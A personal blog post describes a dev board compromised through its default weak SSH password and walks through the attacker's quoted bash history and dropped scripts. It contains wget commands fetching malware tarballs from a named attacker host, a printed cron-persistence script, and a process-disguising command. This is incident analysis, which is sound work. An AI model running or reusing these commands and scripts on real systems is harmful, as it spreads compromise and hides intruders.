---
title:  Been HACKED!
date:   2013-09-07
categories: [Blah]
---

Recently my Kayla development board cannot get correct DHCP address
for some reason. I sent an email to sysadmin. They replied that an
alert was triggered on their IDS and my board was believed has been
compromised, so they blocked it:

~~~
> 128.223.6.140 triggered alerts when it grabbed files from
> superuser.clan.su.  We have identified this type of activity as being
> similar to activity that occurred with a server, during that the same
> timeframe, that was confirmed as being successfully SSH brute
> forced.
>
> Based on the available data 128.223.6.140 likely has an account, with
> a weak password, that was successfully brute forced.
>
> Please block this system on the CIS network until the system
> administrator can investigate the issue.  If you are unable to block
> the system please update this ticket and I'll block the IP address on
> the campus network. IDS alert data is available below.  Timestamps
> are local TZ.
~~~

<!-- more -->

SH*T! Kayla comes with an factory default Ubuntu. There is a default
user `ubuntu` with password `ubuntu`, which is indeed **WEAK**. I am
aware of that but didn’t take it seriously: Kayla is just an embedded
system which contains no critical data, and I thought I won’t be so
unlucky to be the prey.

It turns out I was wrong.

Do tell your son the world is dangerous.

I am curious what has been done on Kayla. Looks like the hacker didn’t
bother to erase his footprint in `~/.bash_history`:

~~~
1399 w
1400 uptime
1401 cd /var/tmp
1402 ls -a
1403 mkdir ". "
1404 cd ". "
1405 wget superuser.clan.su/hu.tgz
1406 tar zxvf hu.tgz
1407 rm -rf hu.tgz
1408 cd .m
1409 ls
1410 nano zmeu.ini
1411 vi zmeu.ini
1412 ./autorun
1413 ./run
1414 uname -a
1415 cd ..
1416 rm -rf .m
1417 wget superuser.clan.su/miau.tgz
1418 tar zxvf miau.tgz
1419 rm -rfm i
1420 cd .us
1421 rm -rf miau.tgz
1422 cd .usr/
1423 ls
1424 vi miaurc
1425 ./h -s /usr/sbin/sshd ./init -d /var/tmp/". "/.usr
1426 cd ..
1427 ls -a
1428 rm -rf .usr/
1429 wget superuser.clan.su/psybnc-linuxRO.tgz
1430 tar zxvf psybnc-linuxRO.tgz
1431 rm -rf psybnc-linuxRO.tgz
1432 mv psybnc/ .p
1433 cd .p
1434 ls
1435 chmod 777 *
1436 chmod +X *
1437 ls
1438 ps x
1439 ps -aux
1440 mv ntpd lightdm
1441 ./lightdm
1442 uname -a
~~~

Hmmm... A directory named `. ` (dot space)? Interesting.

`zmeu.ini`? Google tells me `ZmEu` is an exploit scanner. I downloaded
the `hu.tgz`, unpacked and had a quick check:

~~~
$ file autorun
autorun: POSIX shell script, ASCII text executable
$ cat autorun
#!/bin/sh
pwd > zmeu.dir
dir=$(cat zmeu.dir)
echo "* * * * * $dir/update >/dev/null 2>&1" > zmeu.cron
crontab zmeu.cron
crontab -l | grep update
echo "#!/bin/sh
if test -r $dir/zmeu.pid; then
pid=\$(cat $dir/zmeu.pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > update
chmod u+x update
~~~

OK, he installed a cron job.

~~~
ubuntu@kayla:~$ crontab -l
* * * * * /var/tmp/. /.m/update >/dev/null 2>&1
~~~

Now what’s in `./run`?

~~~
$ file run
run: POSIX shell script, ASCII text executable
$ cat run
#!/bin/sh
export PATH=.
-sh
$ file -- -sh
-sh: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.1, not stripped
~~~

So he invoked a (most likely customized) shell, and what has been done
under this shell is unknown to me.

`miau.tgz`? Google says `miau` is an "IRC-bouncer/proxy". So the
hacker want some IRC bot? 1419~1422 looks like some typo to me. Don’t
panic, dude.

I am wandering what is `./h`. Luckily there is a `h.c` which I guess
is the source code for `./h` in the tarball.

~~~
$ file h
h: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.1, not stripped
$ head h.c
/*

psf -- Process Stack Faker (a.k.a. Fucker)
Coded by Stas; (C)opyLeft by SysD Destructive Labs, 1997-2003

Tested on: FreeBSD 4.3, Linux 2.4, NetBSD 1.5, Solaris 2.7

Compile with:
# gcc -O2 -o h h.c
# strip h
~~~

Good, typical hacker tool.

Next tarball is `psybnc-linuxRO.tgz` which turns out to be yet another
IRC bouncer. Why did he need two IRC bouncer? I doubt I can figure out
the reason.

OH BOY! WAIT! DID I MENTION THAT KAYLA IS AN ARM BASED SYSTEM?

~~~
ubuntu@kayla:~$ uname -a
Linux kayla 3.1.10-carma #1 SMP PREEMPT Wed Jul 10 12:53:50 CEST 2013 armv7l armv7l armv7l GNU/Linux
~~~

All the binaries the hacker downloaded in the tarball are for Intel x86!

I believe this is what the hacker was thinking about when he saw the
output of `uname -a` (line 1442):

> WTF!!!

This makes me feel much better :D
